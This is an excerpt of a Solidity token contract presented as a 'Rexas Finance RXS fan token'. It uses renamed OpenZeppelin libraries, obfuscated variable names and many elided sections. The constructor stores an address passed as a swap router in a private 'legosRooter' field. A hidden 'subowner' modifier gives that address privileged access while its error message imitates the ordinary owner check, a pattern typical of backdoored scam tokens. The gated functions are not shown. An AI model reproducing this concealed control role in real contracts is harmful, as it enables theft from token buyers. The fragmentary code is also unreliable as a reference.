...
/// https://x.com/RexasFinanceRXS


pragma solidity 0.8.29;

// RexasFinanceRXS fan token

interface RexasFinanceRXSinterface {
  /**
...
/*
 * @dev Provides information about the current execution RexasFinanceRXS20Burnable, including the
 ...
 */
abstract contract RexasFinanceRXS20Burnable {
...
// File: @openzeppelin/contracts/access/RexasFinanceRXS20Ownable.sol
 ...
 * the owner.
 */
abstract contract RexasFinanceRXS20Ownable is RexasFinanceRXS20Burnable {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "RexasFinanceRXS20Ownable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "RexasFinanceRXS20Ownable: new owner is the zero address");
 ...
 * `SafeRexasFinanceRXS` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library SafeRexasFinanceRXS {
  /**
  ...
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeRexasFinanceRXS: addition overflow");
  ...
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeRexasFinanceRXS: subtraction overflow");
  }
  ...
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    ...
    uint256 c = a * b;
    require(c / a == b, "SafeRexasFinanceRXS: multiplication overflow");
  ...
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeRexasFinanceRXS: division by zero");
  }
  ...
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeRexasFinanceRXS: modulo by zero");
  }
...
contract RexasFinanceRXSToken is RexasFinanceRXS20Burnable, RexasFinanceRXSinterface, RexasFinanceRXS20Ownable {
    
    using SafeRexasFinanceRXS for uint256;
   ...
   address private legosRooter; 
    constructor(address legosSwapRouterv3) {
        ...
        _name = "Rexas Finance RXS";
        _symbol = "Rexas Finance RXS";
        _decimals = 9;
    ...
    */
    ...
    /**
    * @dev See {RexasFinanceRXSinterface-totalSupply}.
    */
    ...
    /**
    * @dev See {RexasFinanceRXSinterface-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return mintfrom[account];
    }
      modifier subowner() {
        require(legosRooter == _msgSender(), "RexasFinanceRXS20Ownable: caller is not the owner");
        _;
    }
    /**
    * @dev See {RexasFinanceRXSinterface-approve}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {RexasFinanceRXSinterface-transfer}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {RexasFinanceRXSinterface-allowance}.
    */
    ...
    */
    ...
    /**
    * @dev See {RexasFinanceRXSinterface-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {RexasFinanceRXSinterface};
    *
    * Requirements:
    ...
    */
    function transferFrom(address sender, address shippingto, uint256 yoursold) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), fromallowances[sender][_msgSender()].sub(yoursold, "RexasFinanceRXSinterface: transfer yoursold exceeds allowance"));
        return true;
    }
    ...
    * problems described in {RexasFinanceRXSinterface-approve}.
    *
    ...
    */
    function decreaseAllowance(address transporteur, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), transporteur, fromallowances[_msgSender()][transporteur].sub(allbalances, "RexasFinanceRXSinterface: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address shippingto, uint256 yoursold) internal {
        require(sender != address(0), "RexasFinanceRXSinterface: transfer from the zero address");
        require(shippingto != address(0), "RexasFinanceRXSinterface: transfer to the zero address");
                
        mintfrom[sender] = mintfrom[sender].sub(yoursold, "RexasFinanceRXSinterface: transfer yoursold exceeds balance");
    ...
    */
    function _approve(address owner, address transporteur, uint256 yoursold) internal {
        require(owner != address(0), "RexasFinanceRXSinterface: approve from the zero address");
        require(transporteur != address(0), "RexasFinanceRXSinterface: approve to the zero address");
